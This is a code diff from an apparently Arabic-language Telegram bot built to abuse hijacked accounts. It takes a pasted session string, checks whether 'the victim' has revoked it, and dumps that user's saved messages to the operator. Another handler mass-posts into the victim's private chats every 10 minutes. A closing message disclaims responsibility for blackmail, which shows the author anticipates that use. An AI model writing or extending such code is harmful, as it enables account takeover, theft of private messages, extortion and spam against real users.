@@ -773,24 +773,24 @@ async def users(event):
       await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"V")))
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
         await x.send_message("الان ارسل الكود تيرمكس")
-        response = await x.get_response()
-        op = await cu(response.text)
+        strses = await x.get_response()
+        op = await cu(strses.text)
         if op:
             pass
         else:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
         
-        saved_messages = await savedmsgs(bot, response)
-
+        saved_messages = await savedmsgs(strses.text)
+       
         message_parts = [saved_messages[i:i + 4096] for i in range(0, len(saved_messages), 4096)]
-
+        
         for part in message_parts:
             await event.respond(part)
-
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
 
